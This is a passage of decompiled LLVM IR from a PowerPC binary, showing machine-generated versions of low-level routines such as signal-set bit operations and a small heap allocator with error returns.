dec_label_pc_1000edac:                            ; preds = %dec_label_pc_1000ed90
  %v0_1000edac = call i32 @function_1000c85c()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000edb8 = inttoptr i32 %v0_1000edac to i32*
  store i32 22, i32* %v2_1000edb8, align 4
  %v0_1000edcc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000edc8

dec_label_pc_1000edc0:                            ; preds = %dec_label_pc_1000ed90
  %v0_1000edc0 = call i32 @function_1000ef10()
  store i32 %v0_1000edc0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000edc8

dec_label_pc_1000edc8:                            ; preds = %dec_label_pc_1000edac, %dec_label_pc_1000edc0
  %v0_1000edcc = phi i32 [ %v0_1000edcc.pre, %dec_label_pc_1000edac ], [ %v0_1000edc0, %dec_label_pc_1000edc0 ]
  ret i32 %v0_1000edcc

; uselistorder directives
  uselistorder label %dec_label_pc_1000edc8, { 1, 0 }
}

define i32 @function_1000eddc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000eddc:
  store i32 268496372, i32* @lr, align 4
  %v3_1000edf0 = call i32 @function_1000dd4c(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @function_1000ee08(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ee08:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000ee10 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ee10, label %dec_label_pc_1000ee34, label %dec_label_pc_1000ee24

dec_label_pc_1000ee24:                            ; preds = %dec_label_pc_1000ee08
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000ee34, label %dec_label_pc_1000ee2c

dec_label_pc_1000ee2c:                            ; preds = %dec_label_pc_1000ee24
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ee64.lr.ph, label %dec_label_pc_1000ee34

dec_label_pc_1000ee34:                            ; preds = %dec_label_pc_1000ee2c, %dec_label_pc_1000ee24, %dec_label_pc_1000ee08
  %v0_1000ee34 = call i32 @function_1000c85c()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ee40 = inttoptr i32 %v0_1000ee34 to i32*
  store i32 22, i32* %v2_1000ee40, align 4
  %v0_1000eed4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed0

dec_label_pc_1000ee64.lr.ph:                      ; preds = %dec_label_pc_1000ee2c
  %v2_1000ee54 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000ee54, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ee6422 = add i32 %v2_1000ee54, 128
  %v3_1000ee6423 = inttoptr i32 %v2_1000ee6422 to i32*
  store i32 0, i32* %v3_1000ee6423, align 4
  %v0_1000ee6824 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee6825 = add i32 %v0_1000ee6824, -1
  store i32 %v1_1000ee6825, i32* %r11.global-to-local, align 4
  %v1_1000ee6c26 = mul i32 %v1_1000ee6825, 4
  %v1_1000ee7027 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ee7028 = add i32 %v1_1000ee7027, %v1_1000ee6c26
  store i32 %v2_1000ee7028, i32* %r9.global-to-local, align 4
  %v0_1000ee7429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee7430 = add i32 %v0_1000ee7429, -1
  store i32 %v1_1000ee7430, i32* %ctr.global-to-local, align 4
  %v2_1000ee7431 = icmp eq i32 %v1_1000ee7430, 0
  br i1 %v2_1000ee7431, label %dec_label_pc_1000ee78, label %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge

dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge: ; preds = %dec_label_pc_1000ee64.lr.ph, %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge
  %v2_1000ee7032 = phi i32 [ %v2_1000ee70, %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge ], [ %v2_1000ee7028, %dec_label_pc_1000ee64.lr.ph ]
  %v0_1000ee64.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ee64 = add i32 %v2_1000ee7032, 4
  %v3_1000ee64 = inttoptr i32 %v2_1000ee64 to i32*
  store i32 %v0_1000ee64.pre, i32* %v3_1000ee64, align 4
  %v0_1000ee68 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee68 = add i32 %v0_1000ee68, -1
  store i32 %v1_1000ee68, i32* %r11.global-to-local, align 4
  %v1_1000ee6c = mul i32 %v1_1000ee68, 4
  %v1_1000ee70 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ee70 = add i32 %v1_1000ee70, %v1_1000ee6c
  store i32 %v2_1000ee70, i32* %r9.global-to-local, align 4
  %v0_1000ee74 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee74 = add i32 %v0_1000ee74, -1
  store i32 %v1_1000ee74, i32* %ctr.global-to-local, align 4
  %v2_1000ee74 = icmp eq i32 %v1_1000ee74, 0
  br i1 %v2_1000ee74, label %dec_label_pc_1000ee78, label %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge

dec_label_pc_1000ee78:                            ; preds = %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge, %dec_label_pc_1000ee64.lr.ph
  %v0_1000ee7c.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ee78 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ee78, i32* @r3, align 4
  store i32 %v0_1000ee7c.pre, i32* @r4, align 4
  %v0_1000ee80 = call i32 @function_1000ef10()
  %v1_1000ee84 = icmp slt i32 %v0_1000ee80, 0
  br i1 %v1_1000ee84, label %dec_label_pc_1000eecc, label %dec_label_pc_1000ee8c

dec_label_pc_1000ee8c:                            ; preds = %dec_label_pc_1000ee78
  %v0_1000ee90 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ee98 = call i32 @function_1000eee8(i32 ptrtoint (i32* @global_var_10031bb8.758 to i32), i32 %v0_1000ee90)
  %v2_1000eea4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268496572, i32* @lr, align 4
  %v4_1000eeb8 = call i32 @function_100122a8(i32 %v0_1000ee90, i32* nonnull %stack_var_-296, i32 %v2_1000eea4)
  %v1_1000eebc = icmp slt i32 %v4_1000eeb8, 0
  br i1 %v1_1000eebc, label %dec_label_pc_1000eecc, label %dec_label_pc_1000eec4

dec_label_pc_1000eec4:                            ; preds = %dec_label_pc_1000ee8c
  %v3_1000eec4 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000eec4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed0

dec_label_pc_1000eecc:                            ; preds = %dec_label_pc_1000ee8c, %dec_label_pc_1000ee78
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000eed0

dec_label_pc_1000eed0:                            ; preds = %dec_label_pc_1000eec4, %dec_label_pc_1000ee34, %dec_label_pc_1000eecc
  %v0_1000eed4 = phi i32 [ %v3_1000eec4, %dec_label_pc_1000eec4 ], [ %v0_1000eed4.pre, %dec_label_pc_1000ee34 ], [ -1, %dec_label_pc_1000eecc ]
  ret i32 %v0_1000eed4

; uselistorder directives
  uselistorder i32 %v1_1000ee74, { 1, 0 }
  uselistorder i32 %v2_1000ee70, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 5, 3, 4 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000eed0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ee64.dec_label_pc_1000ee64_crit_edge, { 1, 0 }
}

define i32 @function_1000eee8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000eee8:
  %v1_1000eee8 = add i32 %arg2, -1
  %v1_1000eeec = call i32 @__asm_rlwinm(i32 %v1_1000eee8, i32 29, i32 3, i32 29)
  %v1_1000eef0 = urem i32 %v1_1000eee8, 32
  %v2_1000eef4 = add i32 %v1_1000eeec, %arg1
  %v3_1000eef4 = inttoptr i32 %v2_1000eef4 to i32*
  %v4_1000eef4 = load i32, i32* %v3_1000eef4, align 4
  %v3_1000eefc = shl i32 1, %v1_1000eef0
  %v2_1000ef00 = and i32 %v4_1000eef4, %v3_1000eefc
  %v2_1000ef04 = icmp ne i32 %v2_1000ef00, 0
  %v5_1000ef08 = zext i1 %v2_1000ef04 to i32
  ret i32 %v5_1000ef08
}

define i32 @function_1000ef10() local_unnamed_addr {
dec_label_pc_1000ef10:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000ef10 = load i32, i32* @r4, align 4
  %v1_1000ef10 = add i32 %v0_1000ef10, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000ef18 = call i32 @__asm_rlwinm(i32 %v1_1000ef10, i32 29, i32 3, i32 29)
  %v1_1000ef1c = urem i32 %v1_1000ef10, 32
  %v1_1000ef20 = load i32, i32* @r3, align 4
  %v2_1000ef20 = add i32 %v1_1000ef20, %v1_1000ef18
  %v3_1000ef20 = inttoptr i32 %v2_1000ef20 to i32*
  %v4_1000ef20 = load i32, i32* %v3_1000ef20, align 4
  %v0_1000ef24 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000ef24 = shl i32 %v0_1000ef24, %v1_1000ef1c
  store i32 %v3_1000ef24, i32* %r0.global-to-local, align 4
  %v2_1000ef28 = or i32 %v3_1000ef24, %v4_1000ef20
  store i32 %v2_1000ef28, i32* %v3_1000ef20, align 4
  ret i32 0
}

define i32 @function_1000ef38(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ef38:
  %v1_1000ef38 = add i32 %arg2, -1
  %v1_1000ef40 = call i32 @__asm_rlwinm(i32 %v1_1000ef38, i32 29, i32 3, i32 29)
  %v1_1000ef44 = urem i32 %v1_1000ef38, 32
  %v2_1000ef48 = add i32 %v1_1000ef40, %arg1
  %v3_1000ef48 = inttoptr i32 %v2_1000ef48 to i32*
  %v4_1000ef48 = load i32, i32* %v3_1000ef48, align 4
  %v3_1000ef4c = shl i32 -2, %v1_1000ef44
  %v4_1000ef4c = sub nsw i32 32, %v1_1000ef44
  %v5_1000ef4c = lshr i32 -2, %v4_1000ef4c
  %v6_1000ef4c = or i32 %v5_1000ef4c, %v3_1000ef4c
  %v2_1000ef50 = and i32 %v6_1000ef4c, %v4_1000ef48
  store i32 %v2_1000ef50, i32* %v3_1000ef48, align 4
  ret i32 0
}

define i32 @function_1000ef60(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ef60:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ef68 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ef68 = icmp eq i32 %v0_1000ef68, 0
  br i1 %v3_1000ef68, label %dec_label_pc_1000ef78, label %dec_label_pc_1000ef7c

dec_label_pc_1000ef78:                            ; preds = %dec_label_pc_1000ef60
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ef7c

dec_label_pc_1000ef7c:                            ; preds = %dec_label_pc_1000ef60, %dec_label_pc_1000ef78
  %v0_1000ef8c = phi i32 [ 1, %dec_label_pc_1000ef78 ], [ %v0_1000ef68, %dec_label_pc_1000ef60 ]
  %v3_1000ef80 = icmp ugt i32 %v0_1000ef8c, -8
  br i1 %v3_1000ef80, label %dec_label_pc_1000f090, label %dec_label_pc_1000ef88

dec_label_pc_1000ef88:                            ; preds = %dec_label_pc_1000ef7c
  %v1_1000ef8c = add i32 %v0_1000ef8c, 4
  store i32 ptrtoint (i32* @global_var_10031b88.759 to i32), i32* @r29, align 4
  store i32 %v1_1000ef8c, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10031b88.759 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ef9c = call i32 @function_10010040()
  %v2_1000efa4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18200), i32* %r3.global-to-local, align 4
  %v3_1000efac = call i32 @function_1000f1b8(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18200) to i32*), i32 %v2_1000efa4)
  store i32 %v3_1000efac, i32* %r31.global-to-local, align 4
  %v0_1000efb4 = load i32, i32* @r29, align 4
  store i32 %v0_1000efb4, i32* %r3.global-to-local, align 4
  %v0_1000efb8 = call i32 @function_10010040()
  store i32 %v0_1000efb8, i32* %r3.global-to-local, align 4
  %v3_1000efbc = icmp eq i32 %v3_1000efac, 0
  br i1 %v3_1000efbc, label %dec_label_pc_1000efc4, label %dec_label_pc_1000f074.thread

dec_label_pc_1000f074.thread:                     ; preds = %dec_label_pc_1000ef88
  br label %dec_label_pc_1000f088

dec_label_pc_1000efc4:                            ; preds = %dec_label_pc_1000ef88
  %v3_1000efc8 = load i32, i32* @global_var_1002b948.762, align 4
  store i32 %v3_1000efc8, i32* %r31.global-to-local, align 4
  %v3_1000efcc = load i32, i32* %stack_var_-40, align 4
  %v2_1000efd0 = icmp ult i32 %v3_1000efcc, %v3_1000efc8
  br i1 %v2_1000efd0, label %dec_label_pc_1000efe8, label %dec_label_pc_1000efd8

dec_label_pc_1000efd8:                            ; preds = %dec_label_pc_1000efc4
  %v1_1000efdc = sub i32 0, %v3_1000efc8
  %v2_1000efd8 = add i32 %v3_1000efc8, -1
  %v1_1000efe0 = add i32 %v2_1000efd8, %v3_1000efcc
  %v2_1000efe4 = and i32 %v1_1000efe0, %v1_1000efdc
  store i32 %v2_1000efe4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000efe8

dec_label_pc_1000efe8:                            ; preds = %dec_label_pc_1000efc4, %dec_label_pc_1000efd8
  store i32 ptrtoint (i32* @global_var_10031c38.763 to i32), i32* %r3.global-to-local, align 4
  %v0_1000eff4 = call i32 @function_10010040()
  %v0_1000eff8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000eff8, i32* %r3.global-to-local, align 4
  store i32 268496896, i32* @lr, align 4
  %v1_1000effc = call i32 @function_1001057c(i32 %v0_1000eff8)
  store i32 %v1_1000effc, i32* %r3.global-to-local, align 4
  %v3_1000f000 = icmp eq i32 %v1_1000effc, -1
  br i1 %v3_1000f000, label %dec_label_pc_1000f020, label %dec_label_pc_1000f008

dec_label_pc_1000f008:                            ; preds = %dec_label_pc_1000efe8
  %v1_1000f008 = add i32 %v1_1000effc, 3
  %v1_1000f00c = call i32 @__asm_rlwinm(i32 %v1_1000f008, i32 0, i32 0, i32 29)
  store i32 %v1_1000f00c, i32* @r30, align 4
  %v4_1000f010 = icmp eq i32 %v1_1000f00c, %v1_1000effc
  br i1 %v4_1000f010, label %dec_label_pc_1000f020, label %dec_label_pc_1000f018

dec_label_pc_1000f018:                            ; preds = %dec_label_pc_1000f008
  %v2_1000f018 = sub i32 %v1_1000f00c, %v1_1000effc
  store i32 %v2_1000f018, i32* %r3.global-to-local, align 4
  store i32 268496928, i32* @lr, align 4
  %v1_1000f01c = call i32 @function_1001057c(i32 %v2_1000f018)
  store i32 %v1_1000f01c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f020

dec_label_pc_1000f020:                            ; preds = %dec_label_pc_1000f008, %dec_label_pc_1000efe8, %dec_label_pc_1000f018
  store i32 ptrtoint (i32* @global_var_10031c38.763 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f028 = call i32 @function_10010040()
  store i32 %v0_1000f028, i32* %r3.global-to-local, align 4
  %v0_1000f02c = load i32, i32* @r30, align 4
  %v3_1000f02c = icmp eq i32 %v0_1000f02c, -1
  br i1 %v3_1000f02c, label %dec_label_pc_1000f090, label %dec_label_pc_1000f074

dec_label_pc_1000f074:                            ; preds = %dec_label_pc_1000f020
  store i32 ptrtoint (i32* @global_var_10031b88.759 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002b8e8 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10031b88.759 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f048 = call i32 @function_10010040()
  %v0_1000f04c = load i32, i32* @r31, align 4
  %v0_1000f050 = load i32, i32* @r30, align 4
  %v0_1000f054 = load i32, i32* @r29, align 4
  store i32 %v0_1000f054, i32* %r3.global-to-local, align 4
  store i32 268496988, i32* @lr, align 4
  %v3_1000f058 = inttoptr i32 %v0_1000f054 to i32*
  %v4_1000f058 = call i32 @function_1000f2a0(i32* %v3_1000f058, i32 %v0_1000f050, i32 %v0_1000f04c)
  %v0_1000f05c = load i32, i32* @r29, align 4
  store i32 %v0_1000f05c, i32* %r3.global-to-local, align 4
  %v2_1000f064 = inttoptr i32 %v0_1000f05c to i32*
  %v3_1000f064 = call i32 @function_1000f1b8(i32* %v2_1000f064, i32 %v2_1000efa4)
  store i32 %v3_1000f064, i32* %r31.global-to-local, align 4
  %v0_1000f06c = load i32, i32* @r28, align 4
  store i32 %v0_1000f06c, i32* %r3.global-to-local, align 4
  %v0_1000f070 = call i32 @function_10010040()
  store i32 %v0_1000f070, i32* %r3.global-to-local, align 4
  %v3_1000f074 = icmp eq i32 %v3_1000f064, 0
  br i1 %v3_1000f074, label %dec_label_pc_1000f088.thread, label %dec_label_pc_1000f088

dec_label_pc_1000f088.thread:                     ; preds = %dec_label_pc_1000f074
  br label %dec_label_pc_1000f090

dec_label_pc_1000f088:                            ; preds = %dec_label_pc_1000f074, %dec_label_pc_1000f074.thread
  %v0_1000f088.pr6 = phi i32 [ %v3_1000efac, %dec_label_pc_1000f074.thread ], [ %v3_1000f064, %dec_label_pc_1000f074 ]
  %v3_1000f07c = load i32, i32* %stack_var_-40, align 4
  %v2_1000f080 = inttoptr i32 %v0_1000f088.pr6 to i32*
  store i32 %v3_1000f07c, i32* %v2_1000f080, align 4
  %v0_1000f084 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f084 = add i32 %v0_1000f084, 4
  store i32 %v1_1000f084, i32* @r31, align 4
  %v3_1000f088 = icmp eq i32 %v1_1000f084, 0
  br i1 %v3_1000f088, label %dec_label_pc_1000f090, label %dec_label_pc_1000f0a0

dec_label_pc_1000f090:                            ; preds = %dec_label_pc_1000f088.thread, %dec_label_pc_1000f088, %dec_label_pc_1000f020, %dec_label_pc_1000ef7c
  %v0_1000f090 = call i32 @function_1000c85c()
  store i32 %v0_1000f090, i32* %r3.global-to-local, align 4
  %v2_1000f098 = inttoptr i32 %v0_1000f090 to i32*
  store i32 12, i32* %v2_1000f098, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000f0a0

dec_label_pc_1000f0a0:                            ; preds = %dec_label_pc_1000f088, %dec_label_pc_1000f090
  %v0_1000f0a4 = phi i32 [ %v1_1000f084, %dec_label_pc_1000f088 ], [ 0, %dec_label_pc_1000f090 ]
  store i32 %v0_1000f0a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f0a4

; uselistorder directives
  uselistorder i32 %v0_1000f0a4, { 1, 0 }
  uselistorder i32 %v1_1000f084, { 1, 0, 2 }
  uselistorder i32 %v1_1000f00c, { 1, 0, 2 }
  uselistorder i32 %v1_1000effc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_1000efc8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000efac, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10031b88.759 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000f0a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f090, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000efe8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef7c, { 1, 0 }
}

define i32 @function_1000f0b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f0b8:
  %v3_1000f0c0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000f0c0, label %dec_label_pc_1000f1a4, label %dec_label_pc_1000f0d0

dec_label_pc_1000f0d0:                            ; preds = %dec_label_pc_1000f0b8
  %v1_1000f0d4 = add i32 %arg1, -4
  %v2_1000f0d4 = inttoptr i32 %v1_1000f0d4 to i32*
  %v3_1000f0d4 = load i32, i32* %v2_1000f0d4, align 4
  store i32 %v3_1000f0d4, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r26, align 4
  %v0_1000f0e8 = call i32 @function_10010040()
  %v0_1000f0f0 = load i32, i32* @r28, align 4
  store i32 268497148, i32* @lr, align 4
  %v4_1000f0f8 = call i32 @function_1000f2a0(i32* nonnull @global_var_1002b8e8, i32 %v1_1000f0d4, i32 %v0_1000f0f0)
  %v3_1000f100 = load i32, i32* @global_var_1002b948.762, align 4
  store i32 %v4_1000f0f8, i32* @r29, align 4
  %v1_1000f108 = inttoptr i32 %v4_1000f0f8 to i32*
  %v2_1000f108 = load i32, i32* %v1_1000f108, align 4
  store i32 %v2_1000f108, i32* @r27, align 4
  %v1_1000f10c = mul i32 %v3_1000f100, 8
  %v2_1000f110 = icmp ult i32 %v2_1000f108, %v1_1000f10c
  br i1 %v2_1000f110, label %dec_label_pc_1000f144, label %dec_label_pc_1000f118

dec_label_pc_1000f118:                            ; preds = %dec_label_pc_1000f0d0
  store i32 ptrtoint (i32* @global_var_10031c38.763 to i32), i32* @r28, align 4
  %v0_1000f128 = call i32 @function_10010040()
  store i32 268497204, i32* @lr, align 4
  %v1_1000f130 = call i32 @function_1001057c(i32 0)
  %v0_1000f134 = load i32, i32* @r31, align 4
  %v4_1000f134 = icmp eq i32 %v0_1000f134, %v1_1000f130
  br i1 %v4_1000f134, label %dec_label_pc_1000f14c, label %dec_label_pc_1000f13c

dec_label_pc_1000f13c:                            ; preds = %dec_label_pc_1000f118
  %v0_1000f140 = call i32 @function_10010040()
  br label %dec_label_pc_1000f144

dec_label_pc_1000f144:                            ; preds = %dec_label_pc_1000f0d0, %dec_label_pc_1000f13c
  br label %dec_label_pc_1000f1a0

dec_label_pc_1000f14c:                            ; preds = %dec_label_pc_1000f118
  %v0_1000f14c = load i32, i32* @r29, align 4
  %v1_1000f14c = add i32 %v0_1000f14c, 4
  %v2_1000f14c = inttoptr i32 %v1_1000f14c to i32*
  %v3_1000f14c = load i32, i32* %v2_1000f14c, align 4
  %v3_1000f150 = icmp eq i32 %v3_1000f14c, 0
  br i1 %v3_1000f150, label %dec_label_pc_1000f160, label %dec_label_pc_1000f158

dec_label_pc_1000f158:                            ; preds = %dec_label_pc_1000f14c
  %v1_1000f158 = add i32 %v0_1000f14c, 8
  %v2_1000f158 = inttoptr i32 %v1_1000f158 to i32*
  %v3_1000f158 = load i32, i32* %v2_1000f158, align 4
  %v2_1000f15c = add i32 %v3_1000f14c, 8
  %v3_1000f15c = inttoptr i32 %v2_1000f15c to i32*
  store i32 %v3_1000f158, i32* %v3_1000f15c, align 4
  %v0_1000f160.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f160

dec_label_pc_1000f160:                            ; preds = %dec_label_pc_1000f14c, %dec_label_pc_1000f158
  %v0_1000f160 = phi i32 [ %v0_1000f14c, %dec_label_pc_1000f14c ], [ %v0_1000f160.pre, %dec_label_pc_1000f158 ]
  %v1_1000f160 = add i32 %v0_1000f160, 8
  %v2_1000f160 = inttoptr i32 %v1_1000f160 to i32*
  %v3_1000f160 = load i32, i32* %v2_1000f160, align 4
  %v1_1000f164 = add i32 %v0_1000f160, 4
  %v2_1000f164 = inttoptr i32 %v1_1000f164 to i32*
  %v3_1000f164 = load i32, i32* %v2_1000f164, align 4
  %v3_1000f168 = icmp eq i32 %v3_1000f160, 0
  br i1 %v3_1000f168, label %dec_label_pc_1000f178, label %dec_label_pc_1000f170

dec_label_pc_1000f170:                            ; preds = %dec_label_pc_1000f160
  %v2_1000f170 = add i32 %v3_1000f160, 4
  %v3_1000f170 = inttoptr i32 %v2_1000f170 to i32*
  store i32 %v3_1000f164, i32* %v3_1000f170, align 4
  br label %dec_label_pc_1000f17c

dec_label_pc_1000f178:                            ; preds = %dec_label_pc_1000f160
  store i32 %v3_1000f164, i32* @global_var_1002b8e8, align 4
  br label %dec_label_pc_1000f17c

dec_label_pc_1000f17c:                            ; preds = %dec_label_pc_1000f170, %dec_label_pc_1000f178
  %v0_1000f184 = call i32 @function_10010040()
  %v0_1000f188 = load i32, i32* @r27, align 4
  %v1_1000f188 = load i32, i32* @r29, align 4
  %v0_1000f190 = load i32, i32* @r31, align 4
  %v2_1000f188 = sub i32 12, %v0_1000f188
  %v1_1000f18c = add i32 %v2_1000f188, %v1_1000f188
  %v2_1000f190 = sub i32 %v1_1000f18c, %v0_1000f190
  store i32 268497304, i32* @lr, align 4
  %v1_1000f194 = call i32 @function_1001057c(i32 %v2_1000f190)
  br label %dec_label_pc_1000f1a0

dec_label_pc_1000f1a0:                            ; preds = %dec_label_pc_1000f144, %dec_label_pc_1000f17c
  %v0_1000f1a0 = call i32 @function_10010040()
  br label %dec_label_pc_1000f1a4

dec_label_pc_1000f1a4:                            ; preds = %dec_label_pc_1000f0b8, %dec_label_pc_1000f1a0
  %v0_1000f1b4 = phi i32 [ 0, %dec_label_pc_1000f0b8 ], [ %v0_1000f1a0, %dec_label_pc_1000f1a0 ]
  ret i32 %v0_1000f1b4

; uselistorder directives
  uselistorder i32 %v0_1000f160, { 1, 0 }
  uselistorder i32 (i32)* @function_1001057c, { 1, 0, 3, 2 }
  uselistorder i32 (i32*, i32, i32)* @function_1000f2a0, { 1, 0 }
  uselistorder i32* @global_var_1002b8e8, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f17c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f160, { 1, 0 }
  uselistorder label %dec_label_pc_1000f144, { 1, 0 }
}

define i32 @function_1000f1b8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000f1b8:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000f1b8 = inttoptr i32 %arg2 to i32*
  %v2_1000f1b8 = load i32, i32* %v1_1000f1b8, align 4
  %v1_1000f1bc = add i32 %v2_1000f1b8, 3
  store i32 %v1_1000f1bc, i32* %r9.global-to-local, align 4
  %v1_1000f1c0 = call i32 @__asm_rlwinm(i32 %v1_1000f1bc, i32 0, i32 0, i32 29)
  %v2_1000f1c4 = icmp ugt i32 %v1_1000f1c0, 11
  br i1 %v2_1000f1c4, label %dec_label_pc_1000f248.preheader, label %dec_label_pc_1000f1cc

dec_label_pc_1000f1cc:                            ; preds = %dec_label_pc_1000f1b8
  br label %dec_label_pc_1000f248.preheader

dec_label_pc_1000f248.preheader:                  ; preds = %dec_label_pc_1000f1b8, %dec_label_pc_1000f1cc
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000f1cc ], [ %v1_1000f1c0, %dec_label_pc_1000f1b8 ]
  %v0_1000f22c = phi i32 [ 12, %dec_label_pc_1000f1cc ], [ %v1_1000f1c0, %dec_label_pc_1000f1b8 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000f2485 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000f2485, label %dec_label_pc_1000f250, label %dec_label_pc_1000f1d8

dec_label_pc_1000f1d8:                            ; preds = %dec_label_pc_1000f248.preheader, %dec_label_pc_1000f244
  %v0_1000f244 = phi i32 [ %storemerge, %dec_label_pc_1000f244 ], [ %storemerge2, %dec_label_pc_1000f248.preheader ]
  %v1_1000f1d8 = inttoptr i32 %v0_1000f244 to i32*
  %v2_1000f1d8 = load i32, i32* %v1_1000f1d8, align 4
  store i32 %v2_1000f1d8, i32* %r10.global-to-local, align 4
  %v2_1000f1dc = icmp ult i32 %v2_1000f1d8, %v0_1000f22c
  br i1 %v2_1000f1dc, label %dec_label_pc_1000f244, label %dec_label_pc_1000f1e4

dec_label_pc_1000f1e4:                            ; preds = %dec_label_pc_1000f1d8
  %v1_1000f1e4 = add i32 %v0_1000f22c, 44
  %v2_1000f1e8 = icmp ult i32 %v2_1000f1d8, %v1_1000f1e4
  br i1 %v2_1000f1e8, label %dec_label_pc_1000f1f0, label %dec_label_pc_1000f22c

dec_label_pc_1000f1f0:                            ; preds = %dec_label_pc_1000f1e4
  %v1_1000f1f0 = add i32 %v0_1000f244, 4
